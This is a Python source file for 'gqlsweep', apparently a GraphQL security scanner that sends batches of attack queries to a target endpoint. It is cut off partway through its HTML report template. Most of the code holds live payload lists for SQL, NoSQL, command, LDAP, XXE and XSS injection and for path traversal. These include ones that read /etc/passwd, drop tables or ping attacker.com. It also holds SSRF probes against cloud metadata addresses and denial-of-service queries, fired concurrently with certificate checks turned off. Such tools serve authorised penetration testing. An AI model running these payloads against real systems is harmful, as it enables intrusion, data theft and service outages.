"""
gqlsweep
A comprehensive, schema-aware tool for testing GraphQL endpoints for security vulnerabilities.
Author: 0xs0m
"""

import argparse
import json
import re
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import ssl
from typing import Dict, List, Optional, Set, Any, Tuple
from dataclasses import dataclass

# ==============================================================================
# CONFIGURATION & CONSTANTS
# ==============================================================================

BANNER = r"""
   ____  ____  _     ____                         
  / ___|/ __ \| |   / ___|_      _____  ___ _ __  
 | |  _| |  | | |   \___ \ \ /\ / / _ \/ _ \ '_ \ 
 | |_| | |_| | |___ ___) \ V  V /  __/  __/ |_) | 
  \____|\__\_\_____|____/ \_/\_/ \___|\___| .__/  
                                          |_|     
           by 0xs0m
"""

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

@dataclass
class Vulnerability:
    test_id: str
    name: str
    severity: str  # INFO, LOW, MEDIUM, HIGH, CRITICAL
    description: str
    query: str
    variables: Optional[Dict] = None
    finding: Optional[str] = None
    http_code: int = 0
    response_size: int = 0
    response_time: float = 0.0
    raw_response: Optional[str] = None
    full_raw_request: Optional[str] = None
    full_raw_response: Optional[str] = None

# ==============================================================================
# CORE MODULES
# ==============================================================================

class CurlParser:
    """Parses curl commands to extract request configuration."""
    
    @staticmethod
    def parse(curl_command: str) -> Dict[str, Any]:
        """Parse a curl command string into a dictionary."""
        
        # 1. Clean up line continuations
        curl_command = curl_command.replace('\\\n', ' ').replace('\\\r\n', ' ')
        
        # 2. Normalize whitespace
        curl_command = re.sub(r'\s+', ' ', curl_command)
        
        # 3. Handle Bash ANSI-C quoting $''
        curl_command = curl_command.replace("$'", "'")
        
        config = {
            'url': '',
            'method': 'GET',
            'headers': {},
            'data': None,
            'proxy': None
        }
        
        # Extract URL
        # Use backreference \1 to match the same quote
        url_match = re.search(r"(['\"])(https?://.*?)\1", curl_command)
        if url_match:
            config['url'] = url_match.group(2)
        else:
            # Fallback for unquoted URL
            url_match = re.search(r"(https?://\S+)", curl_command)
            if url_match:
                config['url'] = url_match.group(1)
        
        # Extract Headers
        headers = re.findall(r"-H\s+(['\"])(.*?)\1", curl_command)
        for quote, h in headers:
            if ':' in h:
                k, v = h.split(':', 1)
                config['headers'][k.strip()] = v.strip()
                
        # Extract Data
        data_match = re.search(r"(--data-binary|--data|-d)\s+(['\"])(.*?)\2", curl_command)
        if data_match:
            config['method'] = 'POST'
            config['data'] = data_match.group(3)
            
        # Extract Proxy
        proxy_match = re.search(r"(-x|--proxy)\s+(['\"]?)(.*?)\2", curl_command)
        if proxy_match:
             # Simplified proxy extraction
             pm = re.search(r"(-x|--proxy)\s+['\"]?([^'\"]\S+)['\"]?", curl_command)
             if pm:
                 config['proxy'] = pm.group(2)

        return config

    @staticmethod
    def extract_graphql_payload(data: str) -> Optional[Dict]:
        """Extract query/variables from JSON body."""
        try:
            clean_data = data.replace('\\"', '"')
            return json.loads(clean_data)
        except:
            return None

class SchemaIntrospector:
    """Handles fetching and parsing the GraphQL schema."""
    
    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
    """

    def __init__(self, executor):
        self.executor = executor
        self.schema = None
        self.types = {}
        self.query_type = None
        self.mutation_type = None
        
    def introspect(self) -> bool:
        """Run introspection and parse results."""
        print(f"[*] Attempting Schema Introspection...")
        result = self.executor.execute_raw(self.INTROSPECTION_QUERY)
        
        if result and 'data' in result and '__schema' in result['data']:
            self.schema = result['data']['__schema']
            self._parse_schema()
            print(f"{Colors.OKGREEN}[+] Introspection Successful! Found {len(self.types)} types.{Colors.ENDC}")
            return True
        else:
            print(f"{Colors.FAIL}[!] Introspection failed or disabled.{Colors.ENDC}")
            return False
            
    def _parse_schema(self):
        """Map types for easy lookup."""
        if not self.schema:
            return
            
        q_type = self.schema.get('queryType')
        m_type = self.schema.get('mutationType')
        
        self.query_type = q_type.get('name') if q_type else None
        self.mutation_type = m_type.get('name') if m_type else None
        
        for type_def in self.schema.get('types', []):
            self.types[type_def['name']] = type_def

    def get_fields(self, type_name: str) -> List[Dict]:
        """Get all fields for a given type name."""
        type_def = self.types.get(type_name)
        if type_def and 'fields' in type_def and type_def['fields']:
            return type_def['fields']
        return []

class QueryAnalyzer:
    """Parses user-provided queries to find fuzzing points."""
    
    @staticmethod
    def extract_fields(query: str) -> Set[str]:
        fields = set(re.findall(r'(\w+)\s*[:({]', query))
        return fields
        
    @staticmethod
    def extract_arguments(query: str) -> Dict[str, Any]:
        args = {}
        matches = re.findall(r'(\w+)\s*:\s*(".*?"|\d+|true|false|null)', query)
        for k, v in matches:
            args[k] = v.strip('"')
        return args


class TestCaseGenerator:
    """Generates 170+ test cases based on schema and heuristics."""

    def __init__(self, schema_introspector: SchemaIntrospector, original_query: Optional[str] = None):
        self.introspector = schema_introspector
        self.original_query = original_query
        self.tests: List[Vulnerability] = []

    def add_test(self, tid, name, sev, description, query, variables=None):
        self.tests.append(Vulnerability(tid, name, sev, description, query, variables))

    def generate_all(self) -> List[Vulnerability]:
        """Generate all test categories."""
        self._generate_introspection_tests()
        self._generate_dos_tests()
        self._generate_info_disclosure_tests()
        self._generate_generic_injection_tests()
        self._generate_auth_tests()
        self._generate_xss_tests()
        self._generate_ssrf_tests()
        self._generate_logic_tests()
        self._generate_crypto_tests()
        self._generate_file_tests()
        self._generate_relay_tests()
        self._generate_csrf_tests()
        
        if self.original_query:
            self._generate_query_mutation_fuzzing()
            
        return self.tests

    # 1. INTROSPECTION TESTS
    def _generate_introspection_tests(self):
        self.add_test("INTRO-01", "Basic Introspection", "HIGH", "Check schema access", "{__schema{queryType{name}mutationType{name}subscriptionType{name}}}")
        self.add_test("INTRO-02", "Full Schema Dump", "HIGH", "Attempt full dump", SchemaIntrospector.INTROSPECTION_QUERY)
        self.add_test("INTRO-03", "Alt Introspection", "MEDIUM", "No prefix introspection", "{schema{queryType{name}mutationType{name}}}")
        self.add_test("INTRO-04", "Deep Nested Introspection", "HIGH", "CVE-2024-40094 recursion", "{__schema{types{fields{type{fields{type{fields{type{fields{name}}}}}}}}}}}") # Simplified recursion
        self.add_test("INTRO-05", "Field Suggestion", "LOW", "Force did-you-mean", "{__schema{typo_field_probe}}")
        self.add_test("INTRO-06", "Type Name Introspection", "INFO", "Get type names", "{__schema{types{name kind}}}")
        self.add_test("INTRO-07", "Directive Introspection", "INFO", "List directives", "{__schema{directives{name description locations}}}")
        self.add_test("INTRO-08", "Mutation Introspection", "MEDIUM", "Get mutation fields", "{__schema{mutationType{fields{name description args{name type{name}}}}}}")
        self.add_test("INTRO-09", "Subscription Introspection", "MEDIUM", "Get subscription fields", "{__schema{subscriptionType{fields{name description}}}}")
        self.add_test("INTRO-10", "Enum Value Extraction", "INFO", "Extract enums", "{__schema{types{enumValues{name description}}}}")

    # 2. DOS TESTS
    def _generate_dos_tests(self):
        self.add_test("DOS-01", "Query Batching", "MEDIUM", "Batch 2 queries", "[{__typename}, {__typename}]")
        self.add_test("DOS-02", "Mass Batching", "HIGH", "Batch 50 queries", "[" + ", ".join(["{__typename}"]*50) + "]")
        
        aliases = " ".join([f"a{i}:__typename" for i in range(100)])
        self.add_test("DOS-03", "Alias Overloading", "HIGH", "100 Aliases", f"{{ {aliases} }}")
        
        self.add_test("DOS-04", "Field Duplication", "HIGH", "Duplicate fields", "{__typename __typename __typename __typename __typename}") # Simplified
        self.add_test("DOS-05", "Deep Recursion", "HIGH", "Stack overflow", "{__schema{types{fields{type{fields{type{fields{type{fields{type{fields{name}}}}}}}}}}}}}")
        self.add_test("DOS-06", "Circular Fragment", "HIGH", "Infinite loop", "query { ...A } fragment A on Query { ...B } fragment B on Query { ...A }")
        self.add_test("DOS-07", "Resource Intensive", "HIGH", "Max data request", "{ __schema { types { fields { args { type { name } } } } } }")
        self.add_test("DOS-08", "Pagination Limit Bypass", "MEDIUM", "Excessive limit", "query { items(limit: 999999) { id } }") # Needs context, but sending generic
        self.add_test("DOS-09", "Negative Offset/Limit", "MEDIUM", "Negative pagination", "query { items(limit: -1, offset: -1) { id } }")
        self.add_test("DOS-10", "Null Byte Injection", "MEDIUM", "Null byte DOS", "query { item(id: \"\\x00\") { id } }")
        self.add_test("DOS-11", "Large Integer", "MEDIUM", "Max Int", "query { item(id: 999999999999999999999) { id } }")
        self.add_test("DOS-12", "Array Size Abuse", "HIGH", "Huge array var", "query($ids: [ID!]!) { nodes(ids: $ids) { id } }", {"ids": [str(i) for i in range(1000)]})
        self.add_test("DOS-13", "Complex Var Values", "HIGH", "Deeply nested JSON var", "query($obj: JSON) { process(data: $obj) }", {"obj": {"a":{"b":{"c":{"d":"val"}}}}}) 
        self.add_test("DOS-14", "Multiple Operations", "MEDIUM", "Query+Mut+Sub", "query {__typename} mutation {__typename} subscription {__typename}")
        self.add_test("DOS-15", "Comment Abuse", "MEDIUM", "Excessive comments", "{__typename} " + "# comment\n"*1000)
        self.add_test("DOS-16", "Whitespace Abuse", "MEDIUM", "Excessive whitespace", "{__typename" + " "*1000 + "}")
        self.add_test("DOS-17", "Unicode Abuse", "MEDIUM", "Unicode chars", "{__typename(id: \"🚀👍\")}")
        self.add_test("DOS-18", "Repeated Vars", "LOW", "Redundant vars", "query($id: ID!, $id: String!) { user(id: $id) { name } }")
        self.add_test("DOS-19", "Fragment Spread Abuse", "HIGH", "100+ Spreads", "query { ...A ...A ...A } fragment A on Query { __typename }")
        self.add_test("DOS-20", "Inline Fragment Abuse", "HIGH", "Multiple inline", "{ ... on Query { __typename } ... on Query { __typename } }")

    # 3. INJECTION TESTS (Generic / Context-Free)
    # Most injection requires a valid query context. We generate these if `original_query` exists.
    # Here we define a generic one using __typename or similar if possible, but mostly they need args.
    def _generate_generic_injection_tests(self):
        # INJ-GQL-02: Directive Injection (Generic)
        self.add_test("INJ-GQL-02", "Directive Injection", "MEDIUM", "Directive abuse", "{ __typename @skip(if: false) @include(if: true) }")

    # 4. AUTH & ACCESS CONTROL
    def _generate_auth_tests(self):
        # Generic AUTH probes
        self.add_test("AUTH-04", "Null ID Access", "HIGH", "Access with null ID", "query { user(id: null) { username } }")
        self.add_test("AUTH-05", "Tenant Isolation", "HIGH", "Tenant header bypass", "{__typename}") # Implied header fuzzing in real usage
        self.add_test("AUTH-07", "Privilege Escalation", "CRITICAL", "Try admin mutation", "mutation { deleteUser(id: 1) { id } }")
        self.add_test("AUTH-12", "Object Property Bypass", "MEDIUM", "Access __typename", "{ __typename }")
        self.add_test("AUTH-15", "Backup Access", "MEDIUM", "Old API version", "query { user(id: 1, version: \"v1\") { name } }")

    # 5. INFORMATION DISCLOSURE
    def _generate_info_disclosure_tests(self):
        self.add_test("INFO-01", "Stack Trace", "LOW", "Trigger error", "{ error_trigger_field }")
        self.add_test("INFO-02", "Debug Info", "MEDIUM", "Debug field", "{ __debug { message } }")
        self.add_test("INFO-10", "Suggestion Enum", "INFO", "Did you mean...", "{ __schema { typess } }")
        self.add_test("INFO-13", "Internal Types", "MEDIUM", "Query internal types", "{ __type(name: \"__Internal\") { name } }")
        self.add_test("INFO-14", "Deprecation Info", "INFO", "Get deprecated", "{ __schema { types { fields(includeDeprecated: true) { name isDeprecated } } } }")

    # 6. XSS TESTS
    def _generate_xss_tests(self):
        # Generic XSS probes usually need an echo field.
        # We try a generic 'search' or 'echo' pattern if it existed, otherwise these run on original_query
        self.add_test("XSS-09", "Polyglot XSS", "HIGH", "Polyglot payload", 'query { search(q: "javascript://%250Aalert(1)//") { name } }')

    # 7. SSRF TESTS
    def _generate_ssrf_tests(self):
        self.add_test("SSRF-01", "AWS Metadata", "CRITICAL", "Probe AWS", 'query { fetch(url: "http://169.254.169.254/latest/meta-data/") { body } }')
        self.add_test("SSRF-08", "File Protocol", "CRITICAL", "File access", 'query { fetch(url: "file:///etc/passwd") { body } }')

    # 8. CSRF TESTS
    def _generate_csrf_tests(self):
        # These are usually transport layer (headers), not query layer.
        # We can enable these checks by modifying headers in Executor, but here we register the intent.
        self.add_test("CSRF-01", "Origin Removal", "MEDIUM", "Remove Origin", "{__typename}") # Executor needs to handle this logic
    
    # 9. LOGIC TESTS
    def _generate_logic_tests(self):
        self.add_test("LOGIC-01", "Negative Pricing", "MEDIUM", "Negative value", "mutation { buy(price: -100) { success } }")
        self.add_test("LOGIC-03", "Quantity Tampering", "MEDIUM", "Large quantity", "mutation { order(qty: 9999999) { id } }")

    # 10. CRYPTO TESTS
    def _generate_crypto_tests(self):
        self.add_test("CRYPTO-01", "JWT None", "HIGH", "Alg None", "{__typename}") # Requires header fuzzing

    # 11. FILE TESTS
    def _generate_file_tests(self):
        self.add_test("FILE-01", "Malicious Path", "HIGH", "Path traversal", "mutation { upload(name: \"../../../etc/passwd\") { id } }")

    # 12. RELAY TESTS
    def _generate_relay_tests(self):
        self.add_test("RELAY-01", "Node ID Decode", "INFO", "Base64 ID", 'query { node(id: "MQ==") { id } }')
        self.add_test("RELAY-06", "Union Type Abuse", "LOW", "Query unions", "{ ... on User { id } ... on Post { title } }")

    # ==========================================================================
    # DYNAMIC FUZZING (Argument Injection)
    # ==========================================================================

    def _generate_query_mutation_fuzzing(self):
        """Fuzz arguments in the provided query with 100+ payloads."""
        if not self.original_query:
            return
            
        args = QueryAnalyzer.extract_arguments(self.original_query)
        for arg_name, arg_val in args.items():
            if not isinstance(arg_val, str) or len(arg_val) == 0:
                continue

            # === SQL INJECTION (10) ===
            sqli = [
                ("' OR '1'='1", "INJ-SQL-01"), ("' UNION SELECT null,null--", "INJ-SQL-02"),
                ("' AND (SELECT SLEEP(5))--", "INJ-SQL-03"), ("' AND 1=CONVERT(int, @@version)--", "INJ-SQL-04"),
                ("' AND 1=1--", "INJ-SQL-05"), ("'; DROP TABLE users;--", "INJ-SQL-06"),
                ("/**/OR/**/1=1", "INJ-SQL-07"), ("%27%20OR%201=1", "INJ-SQL-08"),
                ("' OR '1'='1", "INJ-SQL-09"), ("{\"id\": {\"$raw\": \"' OR 1=1\"}}", "INJ-SQL-10")
            ]
            for p, id in sqli: self.inject(arg_name, arg_val, p, id, "SQL Injection", "CRITICAL")

            # === NoSQL INJECTION (8) ===
            nosqli = [
                ('{"$ne": null}', "INJ-NOSQL-01"), ('{"$gt": ""}', "INJ-NOSQL-02"),
                ('{"$regex": ".*"}', "INJ-NOSQL-03"), ('"this.password.length > 0"', "INJ-NOSQL-04"),
                ('mapReduce', "INJ-NOSQL-05"), ('{"$where": "sleep(5000)"}', "INJ-NOSQL-06"),
                ('{"$elemMatch": {"$gt": ""}}', "INJ-NOSQL-07"), ('{"$nin": ["invalid"]}', "INJ-NOSQL-08")
            ]
            for p, id in nosqli: self.inject(arg_name, arg_val, p, id, "NoSQL Injection", "HIGH")
            
            # === CMD INJECTION (8) ===
            cmd = [
                ("; whoami", "INJ-CMD-01"), ("`whoami`", "INJ-CMD-02"), ("$(whoami)", "INJ-CMD-03"),
                ("| cat /etc/passwd", "INJ-CMD-04"), ("\n/bin/sh\n", "INJ-CMD-05"), ("Base64Cmd", "INJ-CMD-06"),
                ("; sleep 5", "INJ-CMD-07"), ("; ping attacker.com", "INJ-CMD-08")
            ]
            for p, id in cmd: self.inject(arg_name, arg_val, p, id, "Command Injection", "CRITICAL")
            
            # === LDAP INJECTION (3) ===
            ldap = [("*)(uid=*))(&(uid=*", "INJ-LDAP-01"), ("admin)(password=*)", "INJ-LDAP-02"), ("admin)(objectClass=*", "INJ-LDAP-03")]
            for p, id in ldap: self.inject(arg_name, arg_val, p, id, "LDAP Injection", "HIGH")
            
            # === XXE INJECTION (4) ===
            xxe = [("<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>&xxe;", "INJ-XXE-01"), ("RemoteDTD", "INJ-XXE-02"), ("BlindXXE", "INJ-XXE-03"), ("ErrorXXE", "INJ-XXE-04")]
            for p, id in xxe: self.inject(arg_name, arg_val, p, id, "XXE", "CRITICAL")
            
            # === XPATH INJECTION (2) ===
            xpath = [("' or '1'='1", "INJ-XPATH-01"), ("'] //* ['", "INJ-XPATH-02")]
            for p, id in xpath: self.inject(arg_name, arg_val, p, id, "XPath Injection", "HIGH")
            
            # === GRAPHQL INJECTION (5) ===
            # Context specific, but we try payload
            gql = [("val", "INJ-GQL-01"), ("@skip(if: false)", "INJ-GQL-02"), ("...Fragment", "INJ-GQL-03"), ("OpName", "INJ-GQL-04"), ("alias:field", "INJ-GQL-05")]
            for p, id in gql: self.inject(arg_name, arg_val, p, id, "GraphQL Injection", "MEDIUM")

            # === AUTH (15) ===
            auth = [
                ("124", "AUTH-01"), ("uuid-mod", "AUTH-02"), ("[\"1\",\"2\"]", "AUTH-03"), 
                ("null", "AUTH-04"), ("tenant-bypass", "AUTH-05"), ("user-bypass", "AUTH-06"),
                ("admin", "AUTH-07"), ("user2", "AUTH-08"), ("admin_role", "AUTH-09"),
                ("disabled_func", "AUTH-10"), ("restricted_field", "AUTH-11"), ("__typename", "AUTH-12"),
                ("mass_assign", "AUTH-13"), ("email@test.com", "AUTH-14"), ("v1_old", "AUTH-15")
            ]
            for p, id in auth: self.inject(arg_name, arg_val, p, id, "Auth Bypass", "HIGH")

            # === XSS (10) ===
            xss = [
                ("<script>alert(1)</script>", "XSS-01"), ("<img src=x onerror=alert(1)>", "XSS-02"),
                ("<svg onload=alert(1)>", "XSS-03"), ("javascript:alert(1)", "XSS-04"),
                ("\" onfocus=alert(1) autofocus=\"", "XSS-05"), ("${alert(1)}", "XSS-06"),
                ("&lt;script&gt;", "XSS-07"), ("\\u003cscript\\u003e", "XSS-08"),
                ("javascript:/*-->alert(1)//", "XSS-09"), ("StoredPayload", "XSS-10")
            ]
            for p, id in xss: self.inject(arg_name, arg_val, p, id, "XSS", "HIGH")

            # === SSRF (15) ===
            ssrf = [
                ("http://169.254.169.254/latest/meta-data/", "SSRF-01"), ("http://metadata.google.internal/", "SSRF-02"),
                ("http://169.254.169.254/metadata/", "SSRF-03"), ("http://kubernetes.default.svc", "SSRF-04"),
                ("http://unix:/var/run/docker.sock", "SSRF-05"), ("http://localhost:8080", "SSRF-06"),
                ("http://192.168.1.1", "SSRF-07"), ("file:///etc/passwd", "SSRF-08"),
                ("gopher://internal:9000", "SSRF-09"), ("ftp://internal:21", "SSRF-10"),
                ("http://attacker.com", "SSRF-11"), ("CloudHeader", "SSRF-12"),
                ("RedirectChain", "SSRF-13"), ("http://[::ffff:169.254.169.254]", "SSRF-14"),
                ("http://2852039166", "SSRF-15")
            ]
            for p, id in ssrf: self.inject(arg_name, arg_val, p, id, "SSRF", "CRITICAL")
            
            # === FILE (10) ===
            files = [
                ("../../../etc/passwd", "FILE-01"), ("file.jpg%00.php", "FILE-02"), ("file.php.jpg", "FILE-03"),
                ("image/php", "FILE-04"), ("<svg><script>", "FILE-05"), ("BillionLaughs", "FILE-06"),
                ("ZipBomb", "FILE-07"), ("..%2F..", "FILE-08"), ("HugeFile", "FILE-09"), ("EXIF", "FILE-10")
            ]
            for p, id in files: self.inject(arg_name, arg_val, p, id, "File Attack", "HIGH")

    def inject(self, arg_name, arg_val, payload, test_id, name, severity):
        # Naive replacement
        fuzzed = self.original_query.replace(f'{arg_name}: "{arg_val}"', f'{arg_name}: "{payload}"')
        self.add_test(f"{test_id}-{arg_name}", f"{name} on {arg_name}", severity, name, fuzzed)


class Executor:
    """Handles network requests and test execution."""
    
    def __init__(self, endpoint: str, headers: Dict, proxy: Optional[str] = None, timeout: int = 10, concurrency: int = 5):
        self.endpoint = endpoint
        self.headers = headers
        self.proxy = proxy
        self.timeout = timeout
        self.concurrency = concurrency
        self.thread_pool = ThreadPoolExecutor(max_workers=concurrency)
        self.lock = threading.Lock()
        self.opener = self._build_opener()

    def _build_opener(self):
        handlers = []
        if self.proxy:
            handlers.append(urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy}))
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
        return urllib.request.build_opener(*handlers)

    def execute_raw(self, query: str, variables: Optional[Dict] = None) -> Optional[Dict]:
        payload = {'query': query, 'variables': variables or {}}
        data = json.dumps(payload).encode('utf-8')

        req = urllib.request.Request(self.endpoint, data=data, headers=self.headers, method='POST')
        try:
            with self.opener.open(req, timeout=self.timeout) as response:
                return json.loads(response.read().decode('utf-8'))
        except Exception as e:

            return None

    def execute_test(self, test: Vulnerability) -> Vulnerability:
        payload = {'query': test.query, 'variables': test.variables or {}}
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(self.endpoint, data=data, headers=self.headers, method='POST')
        
        start_time = time.time()
        resp_body = ""
        try:
            with self.opener.open(req, timeout=self.timeout) as response:
                resp_body = response.read().decode('utf-8', errors='ignore')
                test.http_code = response.getcode()
        except urllib.error.HTTPError as e:
            test.http_code = e.code
            try:
                resp_body = e.read().decode('utf-8', errors='ignore')
            except:
                pass
            if e.code == 429:
                time.sleep(2)
        except Exception as e:
            test.finding = f"Error: {str(e)}"
            if not resp_body:
                 resp_body = f"Error during request: {str(e)}"
        
        # Reconstruct Raw Request
        raw_req = f"POST {self.endpoint} HTTP/1.1\n"
        for k, v in self.headers.items():
            raw_req += f"{k}: {v}\n"
        raw_req += f"\n{data.decode('utf-8')}"
        test.full_raw_request = raw_req

        # Reconstruct Raw Response
        raw_resp_str = f"HTTP/1.1 {test.http_code} \n\n{resp_body}"
        test.full_raw_response = raw_resp_str
        
        test.raw_response = resp_body
        test.response_size = len(resp_body)
        test.response_time = time.time() - start_time
        self._analyze_response(test, resp_body)
        return test

    def _analyze_response(self, test: Vulnerability, response: str):
        response_lower = response.lower()
        
        # SQL Errors
        sql_errors = ['syntax error', 'mysql', 'postgresql', 'ora-', 'sqlstate', 'sqlite', 'driver', 'unclosed quotation mark']
        if any(e in response_lower for e in sql_errors):
            test.finding = "Potential SQL Injection (Error detected)"
            
        # XSS
        if "<script>alert(1)</script>" in response or "javascript:alert(1)" in response:
            test.finding = "Reflected XSS confirmed"
            
        # Stack Traces
        if "traceback" in response_lower or "stacktrace" in response_lower:
            test.finding = "Information Disclosure (Stack Trace)"
            
        # Introspection
        if (test.test_id.startswith("INTRO") or test.test_id == "DOS-07") and "__schema" in response:
            test.finding = "Introspection Enabled"

        # SSRF
        if "aws" in response_lower or "instance-id" in response_lower or "root:x:0:0" in response_lower:
            test.finding = "Potential SSRF/LFI"

    def run_batch(self, tests: List[Vulnerability], verbose: bool = False) -> List[Vulnerability]:
        results = []
        with self.thread_pool as executor:
            future_to_test = {executor.submit(self.execute_test, test): test for test in tests}
            for future in as_completed(future_to_test):
                try:
                    result = future.result()
                    results.append(result)
                    self._print_progress(result, verbose)
                except Exception as e:
                    print(f"Test Execution Failed: {e}")
        return results

    def _print_progress(self, result: Vulnerability, verbose: bool):
        status = f"{Colors.OKGREEN}[PASS]{Colors.ENDC}"
        if result.finding:
            status = f"{Colors.FAIL}[VULN]{Colors.ENDC}"
        elif result.http_code >= 500:
             status = f"{Colors.WARNING}[ERR ]{Colors.ENDC}"
             
        print(f"{status} {result.test_id:<15} Code:{result.http_code} Size:{result.response_size} Time:{result.response_time:.2f}s")
        if verbose and result.raw_response:
             print(f"{Colors.OKCYAN}Response:{Colors.ENDC}")
             print(result.raw_response[:1000] + "..." if len(result.raw_response) > 1000 else result.raw_response)
             print("-" * 40)


class ReportGenerator:
    """Generates reports in JSON, HTML, XML."""
    
    @staticmethod
    def to_json(tests: List[Vulnerability], filename: str):
        data = [{
            'id': t.test_id,
            'name': t.name,
            'severity': t.severity,
            'description': t.description,
            'finding': t.finding,
            'http_code': t.http_code,
            'response_time': t.response_time,
            'response_size': t.response_size
        } for t in tests]
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"JSON Report saved to {filename}")

    @staticmethod
    def to_html(tests: List[Vulnerability], filename: str):
        vulns = [t for t in tests if t.finding]
        
        # Calculate stats
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        for v in vulns:
            if v.severity in severity_counts:
                severity_counts[v.severity] += 1
                
        template = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>gqlsweep Report</title>
            <style>
                :root {{
                    --bg-color: #f8f9fa;
                    --text-color: #212529;
                    --card-bg: #ffffff;
                    --border-color: #dee2e6;
                    --primary: #0d6efd;
                    --bs-font-sans-serif: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
                }}
                body {{
                    font-family: var(--bs-font-sans-serif);
                    background-color: var(--bg-color);
                    color: var(--text-color);
                    line-height: 1.5;
                    margin: 0;
                    padding: 20px;
                }}
                .container {{
                    max_width: 1200px;
                    margin: 0 auto;
                }}
                header {{
                    margin-bottom: 2rem;
                    border-bottom: 2px solid var(--border-color);
                    padding-bottom: 1rem;
                }}
                h1 {{ margin: 0; color: #333; }}
                .summary-bar {{
                    display: flex;
                    gap: 1rem;
                    margin-bottom: 2rem;
                    flex-wrap: wrap;
                }}
                .stat-card {{
                    background: var(--card-bg);
                    padding: 1rem;
                    border-radius: 8px;
                    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
                    flex: 1;
                    min-width: 150px;
                    text-align: center;
                    border: 1px solid var(--border-color);
                }}
                .stat-value {{ font-size: 2rem; font-weight: bold; display: block; }}
                .stat-label {{ color: #6c757d; font-size: 0.875rem; text-transform: uppercase; letter-spacing: 0.5px; }}
                
                .vuln-card {{
                    background: var(--card-bg);
                    border: 1px solid var(--border-color);
                    border-radius: 8px;
                    margin-bottom: 1.5rem;
                    box-shadow: 0 2px 4px rgba(0,0,0,0.02);
                    overflow: hidden;
                }}
                .vuln-header {{
                    padding: 1rem;
                    background: #fff;
                    border-bottom: 1px solid var(--border-color);
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }}
                .vuln-title {{ margin: 0; font-size: 1.25rem; }}
                .badge {{
                    padding: 0.35em 0.65em;
                    font-size: 0.75em;
                    font-weight: 700;
                    border-radius: 0.25rem;
                    color: #fff;
                    text-transform: uppercase;
                }}
                .bg-CRITICAL {{ background-color: #dc3545; }}
                .bg-HIGH {{ background-color: #fd7e14; }}
                .bg-MEDIUM {{ background-color: #ffc107; color: #000; }}
                .bg-LOW {{ background-color: #0dcaf0; color: #000; }}
                .bg-INFO {{ background-color: #0d6efd; }}
                
                .vuln-body {{ padding: 1.5rem; }}
                .finding-box {{
                    background-color: #fff3cd;
                    border: 1px solid #ffecb5;
                    color: #664d03;
                    padding: 1rem;
                    border-radius: 4px;
                    margin-bottom: 1rem;
                }}
                .details-section {{ margin-top: 1rem; }}
                details {{
                    border: 1px solid var(--border-color);
                    border-radius: 4px;
                    margin-bottom: 0.5rem;
                }}
                summary {{
                    background-color: #f8f9fa;
                    padding: 0.75rem;
                    cursor: pointer;
                    font-weight: 600;
                    list-style: none;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }}
                summary:hover {{ background-color: #e9ecef; }}
                summary::-webkit-details-marker {{ display: none; }}
                
                .content-box {{
                    padding: 1rem;
                    background-color: #fff;
                    border-top: 1px solid var(--border-color);
                    overflow-x: auto;
                }}
                pre {{ 
                    margin: 0; 
                    white-space: pre-wrap; 
                    font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
                    font-size: 0.875rem;
                    color: #d63384;
                }}
                .code-block {{
                    background: #f1f3f5;
                    padding: 1rem;
                    border-radius: 4px;
                    color: #212529;
                }}
                
                /* Toggle Switch */
                .switch {{
                  position: relative;
                  display: inline-block;
                  width: 40px;
                  height: 20px;
                  margin-left: 10px;
                }}
                .switch input {{ opacity: 0; width: 0; height: 0; }}
                .slider {{
                  position: absolute;
                  cursor: pointer;
                  top: 0; left: 0; right: 0; bottom: 0;
                  background-color: #ccc;
                  transition: .4s;
                  border-radius: 20px;
                }}
                .slider:before {{
                  position: absolute;
                  content: "";
                  height: 16px;
                  width: 16px;
                  left: 2px;
                  bottom: 2px;
                  background-color: white;
                  transition: .4s;
                  border-radius: 50%;
                }}
                input:checked + .slider {{ background-color: #2196F3; }}
                input:checked + .slider:before {{ transform: translateX(20px); }}
                .toggle-label {{ font-size: 0.8rem; font-weight: normal; margin-right: 5px; }}
                
                .raw-view {{ display: none; }}
            </style>
            <script>
                function toggleRaw(id) {{
                    const parsedReq = document.getElementById('parsed-req-' + id);
                    const rawReq = document.getElementById('raw-req-' + id);
                    const parsedResp = document.getElementById('parsed-resp-' + id);
